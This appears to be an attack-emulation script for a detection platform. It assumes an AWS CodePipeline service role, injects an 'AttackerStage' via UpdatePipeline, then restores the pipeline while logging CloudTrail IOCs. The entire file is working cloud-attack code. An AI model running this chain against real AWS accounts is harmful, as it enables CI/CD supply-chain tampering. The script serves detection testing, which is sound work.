# FILE: attack.py
"""
T1195 Supply Chain Compromise - CodePipeline Stage Injection
Atomic: ATOMIC_CODEPIPELINE_INJECT_STAGE

3-phase attack chain:
  Phase 1 - Assume victim CICD service account role via STS AssumeRole
  Phase 2 - Read pipeline definition via GetPipeline (snapshot for restore)
  Phase 3 - Inject AttackerStage at index 1 via UpdatePipeline, then
             restore original definition immediately via a second UpdatePipeline

Entry point: run(outputs, region)
"""
import sys
import time
import random
import json

# Cross-platform UTF-8 output - prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def print_step(msg):
    print(f"\n[*] {msg}")

def print_ok(msg):
    print(f"[+] {msg}")

def print_err(msg):
    print(f"[-] {msg}")

def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))

def phase_delay():
    time.sleep(random.uniform(5, 15))


# ---------------------------------------------------------------------------
# Entry point (MayaTrail backend contract)
# ---------------------------------------------------------------------------

def _bootstrap_session(outputs: dict, region: str):
    """Session for the initial STS AssumeRole call.

    In the MayaTrail backend the worker injects the tenant's short-lived
    assumed-role credentials as outputs['_aws_credentials']; use them so the
    attack runs in the tenant account, not the worker's. Falls back to the
    ambient default session for standalone runs.
    """
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    Called by the MayaTrail backend runner with Pulumi stack outputs.

    Required outputs keys:
      victim_role_arn   - ARN of the compromised CICD service account role

    Optional outputs keys (fall back to static known names):
      pipeline_name     - physical name of the CodePipeline pipeline
    """
    # --- Resolve required dynamic values from Pulumi outputs -----------------
    victim_role_arn = outputs.get("victim_role_arn")
    if not victim_role_arn:
        raise RuntimeError(
            "Missing required Pulumi output: victim_role_arn. "
            "Ensure the Pulumi stack exports victim_role_arn."
        )

    # Pipeline physical name is known statically; accept override from outputs
    pipeline_name = outputs.get(
        "pipeline_name", "atomic-codepipeline-inject-stage-prod-deploy"
    )

    events_generated = []

    # =========================================================================
    # PHASE 1: Credential Initialization - Assume Victim CICD Role (T1195)
    #
    # The victim role trust policy allows sts:AssumeRole from the account root,
    # so the runner's ambient admin identity can assume it directly.
    # Produces a short-lived STS session scoped to GetPipeline + UpdatePipeline
    # on the target pipeline ARN only.
    # IOC: AssumeRole into CICD service account from admin-user principal.
    # =========================================================================
    print_step("PHASE 1 - Credential Initialization: Assume Victim CICD Role (T1195)")
    print_step(f"Target role: {victim_role_arn}")

    # Bootstrap from the worker-injected tenant credentials (or ambient for
    # standalone runs) for the STS call.
    sts_client = _bootstrap_session(outputs, region).client("sts")

    try:
        assume_resp = sts_client.assume_role(
            RoleArn=victim_role_arn,
            RoleSessionName="AtomicT1195",
        )
        events_generated.append("AssumeRole -> sts.amazonaws.com")
        print_ok(f"AssumeRole succeeded: {assume_resp['AssumedRoleUser']['Arn']}")
    except ClientError as e:
        raise RuntimeError(f"AssumeRole on victim role failed: {e}")

    op_delay(2, 4)

    # Build victim_session from returned STS credentials
    victim_creds = assume_resp["Credentials"]
    victim_session = boto3.Session(
        aws_access_key_id=victim_creds["AccessKeyId"],
        aws_secret_access_key=victim_creds["SecretAccessKey"],
        aws_session_token=victim_creds["SessionToken"],
        region_name=region,
    )

    # Validate the assumed session - generates GetCallerIdentity CloudTrail event
    sts_victim = victim_session.client("sts")
    try:
        identity = sts_victim.get_caller_identity()
        events_generated.append("GetCallerIdentity -> sts.amazonaws.com")
        print_ok(f"Victim session identity confirmed: {identity['Arn']}")
    except ClientError as e:
        # Non-fatal - session is still usable; log and continue
        print_err(f"GetCallerIdentity on victim session failed: {e}")

    op_delay(2, 4)
    phase_delay()

    # =========================================================================
    # PHASE 2: Pipeline Discovery - GetPipeline Snapshot (T1195)
    #
    # Reads the full pipeline definition using the victim session.
    # response['pipeline'] is saved as the restore snapshot for teardown.
    # The CodeBuild ProjectName from the Build stage action is extracted so
    # the injected stage can reuse it - no codebuild:CreateProject permission
    # needed; the victim policy only grants GetPipeline + UpdatePipeline.
    # IOC: GetPipeline call from assumed-role session (non-pipeline-service principal).
    # =========================================================================
    print_step("PHASE 2 - Pipeline Discovery: GetPipeline snapshot (T1195)")
    print_step(f"Target pipeline: {pipeline_name}")

    cp_client = victim_session.client("codepipeline", region_name=region)

    try:
        get_resp = cp_client.get_pipeline(name=pipeline_name)
        events_generated.append("GetPipeline -> codepipeline.amazonaws.com")
        print_ok(f"GetPipeline succeeded - pipeline version: {get_resp['pipeline']['version']}")
    except ClientError as e:
        raise RuntimeError(f"GetPipeline failed: {e}")

    # Store original pipeline dict for restore.
    # 'metadata' is a top-level sibling key in the GetPipeline response (not inside
    # the pipeline dict itself), but strip defensively - UpdatePipeline rejects it.
    original_pipeline = get_resp["pipeline"].copy()
    original_pipeline.pop("metadata", None)

    # Extract the CodeBuild ProjectName from whichever stage uses CodeBuild.
    # The attacker's injected stage reuses this name so no CreateProject is needed.
    build_project_name = None
    for stage in original_pipeline.get("stages", []):
        for action in stage.get("actions", []):
            action_type = action.get("actionTypeId", {})
            cfg = action.get("configuration", {})
            if action_type.get("provider") == "CodeBuild" and cfg.get("ProjectName"):
                build_project_name = cfg["ProjectName"]
                break
        if build_project_name:
            break

    if not build_project_name:
        # Fall back to static name known from infra plan
        build_project_name = "atomic-codepipeline-inject-stage-build"
        print_err(
            f"Could not extract ProjectName from pipeline stages; "
            f"falling back to static name: {build_project_name}"
        )
    else:
        print_ok(f"Discovered CodeBuild project name: {build_project_name}")

    stage_names_before = [s["name"] for s in original_pipeline.get("stages", [])]
    print_ok(f"Current pipeline stages: {stage_names_before}")

    op_delay(2, 5)
    phase_delay()

    # =========================================================================
    # PHASE 3: Stage Injection (T1195)
    #
    # Step 3: Insert AttackerStage at index 1, between Source (index 0) and
    # Build (index 1). The injected CodeBuild action reuses the ProjectName
    # discovered in Phase 2 - no CreateProject permission needed. SourceArtifact
    # matches what the Source stage produces, so CodePipeline wires it without
    # additional config. UpdatePipeline is called with the metadata-stripped,
    # AttackerStage-spliced pipeline dict.
    # IOC: UpdatePipeline adding new stage from non-pipeline-service identity.
    #
    # Step 4 (teardown): Restore original pipeline definition using the snapshot
    # captured in Phase 2. The pipeline version after inject is N+1; restore must
    # send version N+1 to satisfy AWS optimistic-locking, otherwise UpdatePipeline
    # rejects the call with a version conflict error.
    # =========================================================================
    print_step("PHASE 3 - Stage Injection: UpdatePipeline with AttackerStage (T1195)")

    # Deep-copy the original dict so the restore snapshot is never mutated
    poisoned_pipeline = json.loads(json.dumps(original_pipeline))

    attacker_stage = {
        "name": "AttackerStage",
        "actions": [
            {
                "name": "InjectAction",
                "actionTypeId": {
                    "category": "Build",
                    "owner": "AWS",
                    "provider": "CodeBuild",
                    "version": "1",
                },
                "configuration": {
                    # Reuse existing ProjectName - no CreateProject permission needed
                    "ProjectName": build_project_name,
                },
                # SourceArtifact matches what the Source stage outputs
                "inputArtifacts": [{"name": "SourceArtifact"}],
                "outputArtifacts": [],
                "runOrder": 1,
            }
        ],
    }

    # Splice at index 1: [Source, AttackerStage, Build, ...]
    poisoned_pipeline["stages"].insert(1, attacker_stage)
    injected_stage_names = [s["name"] for s in poisoned_pipeline["stages"]]
    print_ok(f"Stage list after splice: {injected_stage_names}")

    inject_succeeded = False
    injected_version = None

    try:
        update_inject = cp_client.update_pipeline(pipeline=poisoned_pipeline)
        events_generated.append(
            "UpdatePipeline (inject AttackerStage) -> codepipeline.amazonaws.com"
        )
        injected_version = update_inject["pipeline"]["version"]
        inject_succeeded = True
        print_ok(
            f"UpdatePipeline (inject) succeeded - "
            f"pipeline version now: {injected_version}"
        )
        print_ok("AttackerStage is live between Source and Build stages")
    except ClientError as e:
        print_err(f"UpdatePipeline (inject) failed: {e}")
        print_err("Proceeding to restore attempt regardless")

    op_delay(5, 10)

    # -------------------------------------------------------------------------
    # PHASE 3 TEARDOWN: Restore original pipeline definition
    #
    # Second UpdatePipeline removes AttackerStage, returning stage list to
    # [Source, Build]. If inject succeeded (version N+1), restore dict must
    # carry version N+1 so AWS accepts the write.
    # IOC: Second UpdatePipeline from same assumed-role session within minutes -
    #      stage-removal pattern consistent with attacker covering tracks.
    # -------------------------------------------------------------------------
    print_step("PHASE 3 TEARDOWN: Restore original pipeline definition")

    restore_pipeline = json.loads(json.dumps(original_pipeline))
    restore_pipeline.pop("metadata", None)

    # Update version to current pipeline version so optimistic-lock check passes
    if inject_succeeded and injected_version is not None:
        restore_pipeline["version"] = injected_version

    try:
        update_restore = cp_client.update_pipeline(pipeline=restore_pipeline)
        events_generated.append(
            "UpdatePipeline (restore original) -> codepipeline.amazonaws.com"
        )
        restored_stages = [s["name"] for s in update_restore["pipeline"]["stages"]]
        print_ok(
            f"UpdatePipeline (restore) succeeded - "
            f"version: {update_restore['pipeline']['version']}"
        )
        print_ok(f"Pipeline restored to original stages: {restored_stages}")
    except ClientError as e:
        print_err(f"UpdatePipeline (restore) failed: {e}")
        print_err(
            "Manual restore required: call GetPipeline then UpdatePipeline "
            "to remove AttackerStage from the pipeline definition"
        )

    op_delay(2, 4)

    # =========================================================================
    # SUMMARY
    # =========================================================================
    print_step("Attack chain complete. CloudTrail events generated:")
    for i, evt in enumerate(events_generated, 1):
        print(f"  {i}. {evt}")

    print_step("MITRE ATT&CK coverage:")
    print("  T1195 - Supply Chain Compromise (Initial Access)")
    print("    Phase 1 : AssumeRole into CICD service account (victim role)")
    print("    Phase 1 : GetCallerIdentity to validate victim session")
    print("    Phase 2 : GetPipeline - snapshot pipeline definition and extract ProjectName")
    print("    Phase 3 : UpdatePipeline - inject AttackerStage at index 1")
    print("    Phase 3+ : UpdatePipeline - restore original pipeline definition")
    print_step(
        "Dwell time recommendation: 300 seconds between inject and restore "
        "in real engagements to allow detection telemetry to flush"
    )
